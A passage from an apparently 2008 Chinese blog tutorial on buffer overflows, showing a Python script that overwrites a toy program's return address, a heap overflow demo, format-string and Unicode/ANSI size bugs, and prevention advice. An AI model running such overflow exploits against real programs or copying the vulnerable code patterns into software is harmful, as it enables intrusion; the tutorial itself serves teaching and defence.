因此，我们只要输入一个超长的字符串，覆盖掉0x08048499，变成bar的函数地址0x8048419，就达到了调用bar函数的目的。为了将0x8048419这样的东西输入到应用程序，我们需要借助于Perl或Python脚本，如下面的Python脚本： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;">import <span style="color: #0e84b5; font-weight: bold;">os</span>

arg <span style="color: #666666;">=</span> <span style="color: #4070a0;">'ABCDEFGHIJKLMN'</span> <span style="color: #666666;">+</span> <span style="color: #4070a0;">'</span><span style="color: #4070a0; font-weight: bold;">"x19"x84"x04"x08</span><span style="color: #4070a0;">'</span>

cmd <span style="color: #666666;">=</span> <span style="color: #4070a0;">'./test '</span> <span style="color: #666666;">+</span> arg

os<span style="color: #666666;">.</span>system(cmd)</div>
</div>

&nbsp;

注意上面的08 04 84 19要两个两个反着写。执行一下： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">$</span><span style="color: #ffffff;">python</span> <span style="color: #ffffff;">hack</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">py</span> 

<span style="color: #ffffff;">Address</span> <span style="color: #ffffff;">of</span> <span style="color: #ffffff;">foo</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">0x80483d4</span>

<span style="color: #ffffff;">Address</span> <span style="color: #ffffff;">of</span> <span style="color: #ffffff;">bar</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">0x8048419</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//bar的函数地址</span>

<span style="color: #ffffff;">My</span> <span style="color: #ffffff;">stack</span> <span style="color: #ffffff;">looks</span> <span style="color: #ffffff;">like:</span>

<span style="color: #ffffff;">0xb7fc24e0</span>

<span style="color: #ffffff;">0x8048616</span>

<span style="color: #ffffff;">0xbf832484</span>

<span style="color: #ffffff;">0xbf832484</span>

<span style="color: #ffffff;">0xb7fc1ff4</span>

<span style="color: #ffffff;">0xbf832498</span>

<span style="color: #ffffff;">0x8048499</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//strcpy前函数返回地址0x8048499</span>

<span style="color: #ffffff;">buf</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">ABCDEFGHIJKLMN</span><span style="color: #ffffff;">�</span>

<span style="color: #ffffff;">Now</span> <span style="color: #ffffff;">the</span> <span style="color: #ffffff;">stack</span> <span style="color: #ffffff;">looks</span> <span style="color: #ffffff;">like:</span>

<span style="color: #ffffff;">0xbf83246e</span>

<span style="color: #ffffff;">0x8048616</span>

<span style="color: #ffffff;">0x42412484</span>

<span style="color: #ffffff;">0x46454443</span>

<span style="color: #ffffff;">0x4a494847</span>

<span style="color: #ffffff;">0x4e4d4c4b</span>

<span style="color: #ffffff;">0x8048419</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//瞧，返回地址被修改为了我们想要的bar的函数地址0x8048419 </span>

<span style="color: #ffffff;">Augh</span><span style="color: #ffffff;">!</span> <span style="color: #ffffff;">I</span><span style="color: #ffffff;">'</span><span style="color: #ffffff;">ve</span> <span style="color: #ffffff;">been</span> <span style="color: #ffffff;">hacked</span><span style="color: #ffffff;">!</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//哈哈！bar函数果然被执行了！</span></div>
</div>

### 堆溢出及其他溢出

#### 堆溢出

堆是内存的一个区域，它 被应用程序利用并在运行时被动态分配。堆内存与堆栈内存的不同在于它在函数之间更持久稳固。这意味着分配给一个函数的内存会持续保持分配直到完全被释放为 止。这说明一个堆溢出可能发生了但却没被注意到，直到该内存段在后面被使用。这里只是简单了解一下，下面看一个最简单的堆溢出例子： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #87ceeb;">/*heap1.c &#8211; 最简单的堆溢出*/</span>

<span style="color: #cd5c5c;">#include &lt;stdio.h&gt;</span>

<span style="color: #cd5c5c;">#include &lt;stdlib.h&gt;</span>

<span style="color: #cd5c5c;">#include &lt;string.h&gt;</span>

<span style="color: #bdb76b;">int</span> <span style="color: #ffffff;">main</span><span style="color: #ffffff;">(</span><span style="color: #bdb76b;">int</span> <span style="color: #ffffff;">argc</span><span style="color: #ffffff;">,</span> <span style="color: #bdb76b;">char</span> <span style="color: #ffffff;">*</span><span style="color: #ffffff;">argv</span><span style="color: #ffffff;">[])</span>

<span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #bdb76b;">char</span> <span style="color: #ffffff;">*</span><span style="color: #ffffff;">input</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">malloc</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">20</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #bdb76b;">char</span> <span style="color: #ffffff;">*</span><span style="color: #ffffff;">output</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">malloc</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">20</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">strcpy</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">output</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">"normal output"</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">strcpy</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">input</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">argv</span><span style="color: #ffffff;">[</span><span style="color: #ffffff;">1</span><span style="color: #ffffff;">]);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"input at %p: %s</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">input</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">input</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"output at %p: %s</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">output</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">output</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">\n\n</span><span style="color: #ffffff;">%s</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">output</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">}</span></div>
</div>

&nbsp;

我们来看执行结果： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">[</span><span style="color: #ffffff;">root</span><span style="color: #ffffff;">@localhost</span><span style="color: #ffffff;">]</span><span style="color: #87ceeb;"># ./heap1 hackshacksuselessdata</span>

<span style="color: #ffffff;">input</span> <span style="color: #ffffff;">at</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8049728</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">hackshacksuselessdata</span>

<span style="color: #ffffff;">output</span> <span style="color: #ffffff;">at</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8049740</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">normal</span> <span style="color: #ffffff;">output</span>

<span style="color: #ffffff;">normal</span> <span style="color: #ffffff;">output</span>

<span style="color: #ffffff;">[</span><span style="color: #ffffff;">root</span><span style="color: #ffffff;">@localhost</span><span style="color: #ffffff;">]</span><span style="color: #87ceeb;"># ./heap1 hacks1hacks2hacks3hacks4hacks5hacks6hacks7hackshackshackshackshackshackshacks</span>

<span style="color: #ffffff;">input</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">at</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8049728</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">hacks1hacks2hacks3hacks4hacks5hacks6hacks7hackshackshackshackshackshackshacks</span>

<span style="color: #ffffff;">output</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">at</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8049740</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">hackshackshackshacks5hacks6hacks7</span>

<span style="color: #ffffff;">hackshacks5hackshacks6hackshacks7</span>

<span style="color: #ffffff;">[</span><span style="color: #ffffff;">root</span><span style="color: #ffffff;">@localhost</span><span style="color: #ffffff;">]</span><span style="color: #87ceeb;"># ./heap1 "hackshacks1hackshacks2hackshacks3hackshacks4what have I done?"</span>

<span style="color: #ffffff;">input</span> <span style="color: #ffffff;">at</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8049728</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">hackshacks1hackshacks2hackshacks3hackshacks4what</span> <span style="color: #ffffff;">have</span> <span style="color: #ffffff;">I</span> <span style="color: #ffffff;">done</span><span style="color: #ffffff;">?</span>

<span style="color: #ffffff;">output</span> <span style="color: #ffffff;">at</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8049740</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">what</span> <span style="color: #ffffff;">have</span> <span style="color: #ffffff;">I</span> <span style="color: #ffffff;">done</span><span style="color: #ffffff;">?</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">//</span><span style="color: #ffffff;">我们看到，</span><span style="color: #ffffff;">output</span><span style="color: #ffffff;">变成了</span><span style="color: #ffffff;">what</span> <span style="color: #ffffff;">have</span> <span style="color: #ffffff;">I</span> <span style="color: #ffffff;">done</span><span style="color: #ffffff;">?</span>

<span style="color: #ffffff;">what</span> <span style="color: #ffffff;">have</span> <span style="color: #ffffff;">I</span> <span style="color: #ffffff;">done</span><span style="color: #ffffff;">?</span>

<span style="color: #ffffff;">[</span><span style="color: #ffffff;">root</span><span style="color: #ffffff;">@localhost</span><span style="color: #ffffff;">]</span><span style="color: #87ceeb;">#</span></div>
</div>

&nbsp;

我们来看看是如何溢出的： 

*   ![](http://images.cnblogs.com/cnblogs_com/coderzh/security/simpleheep.jpg)

#### 格式化字符串错误

这类错误是指使用printf，sprintf，fprint等函数时，没有使用格式化字符串，比如：正确用法是： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #0086d2;">"%s"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">input</span><span style="color: #ffffff;">)</span></div>
</div>

&nbsp;

如果直接写成： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">input</span><span style="color: #ffffff;">)</span></div>
</div>

&nbsp;

将会出现漏洞，当input输入一些非法制造的字符时，内存将有可能被改写，执行一些非法指令。 

#### Unicode和ANSI缓冲区大小不匹配

我们经常碰到需要在Unicode和ANSI之间互相转换，绝大多数Unicode函数按照宽字符格式（双字节）大小，而不是按照字节大小来计算缓冲区大小，因此，转换的时候不注意的话就可能会造成溢出。比如最常受到攻击的函数是MultiByteToWideChar，看下面的代码： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">BOOL</span> <span style="color: #ffffff;">GetName</span><span style="color: #ffffff;">(</span><span style="color: #bdb76b;">char</span> <span style="color: #ffffff;">*</span><span style="color: #ffffff;">szName</span><span style="color: #ffffff;">)</span>

<span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">WCHAR</span> <span style="color: #ffffff;">wszUserName</span><span style="color: #ffffff;">[</span><span style="color: #ffffff;">256</span><span style="color: #ffffff;">];</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">// Convert ANSI name to Unicode.</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">MultiByteToWideChar</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">CP_ACP</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">szName</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">-</span><span style="color: #ffffff;">1</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">wszUserName</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #f0e68c;">sizeof</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">wszUserName</span><span style="color: #ffffff;">));</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//问题出在这个参数上，sizeof(wszUserName)将会等于2*256=512个字节</span>

<span style="color: #ffffff;">}</span></div>
</div>

&nbsp;

wszUserName是宽字符的，因此，sizeof(wszUserName)将会是256*2个字节，因此存在潜在的缓冲区溢出问题。正确的写法应该是这样的： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">MultiByteToWideChar</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">CP_ACP</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">szName</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">-</span><span style="color: #ffffff;">1</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">wszUserName</span><span style="color: #ffffff;">,</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #f0e68c;">sizeof</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">wszUserName</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">/</span> <span style="color: #f0e68c;">sizeof</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">wszUserName</span><span style="color: #ffffff;">[</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">]));</span></div>
</div>

&nbsp;

曾真实出现的Internet打印协议缓冲区溢出就是由于此类问题导致的。 

### 预防和发现问题

#### 不安全的函数

避免使用不安全的字符串处理函数，比如使用安全的函数代替： 

<div>
<table border="1" bordercolor="" cellpadding="" cellspacing="">
    <tbody><tr>
        <td>

 不安全的函数 

        </td>
        <td>

 安全函数 

        </td>
    </tr>
    <tr>
        <td>

 strcpy 

        </td>
        <td>

 strncpy 

        </td>
    </tr>
    <tr>
        <td>

 strcat 

        </td>
        <td>

 strncat 

        </td>
    </tr>
    <tr>
        <td>

 sprintf 

        </td>
        <td>

 _snprintf 

        </td>
    </tr>
    <tr>
        <td>

 gets 

        </td>
        <td>

 fgets 

        </td>
    </tr>
</tbody></table>
</div>

#### Visual C++ NET的/GS选项

/GS选项能够阻止堆栈的破坏，保证堆栈的完整性，但是不能完全防止缓冲区溢出问题，比如，对于堆溢出，/GS是无能为力的。 

#### 源代码扫描

最简单的源代码扫描： 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;">grep strcpy *.c</div>
</div>

然后就是一些开源的或是商业的源代码扫描工具了。 

### 工具

*   源代码工具包含ApplicationDefense、SPLINT、ITS4和Flawfinder。
*   二进制工具包含各种fuzzing工具包和静态分析程序，例如Bugscan。

### 参考资料

1.  Michael Howard, David LeBlanc. "Writing Secure Code"
2.  Mike Andrews, James A. Whittaker "How to Break Web Software"

3.  [http://book.csdn.net/bookfiles/228/index.html](http://book.csdn.net/bookfiles/228/index.html)
4.  缓冲区溢出的原理和实践(Phrack)
下一篇：  
[(原创)攻击方式学习之(4) - 拒绝服务(DOS/DDOS/DRDOS) ](http://www.cnblogs.com/coderzh/archive/2008/09/17/1292808.html)

**[温馨提示]：该文章由原博客园导入而来，如排版效果不佳，请移步：[http://www.cnblogs.com/coderzh/archive/2008/09/06/1285693.html](http://www.cnblogs.com/coderzh/archive/2008/09/06/1285693.html)**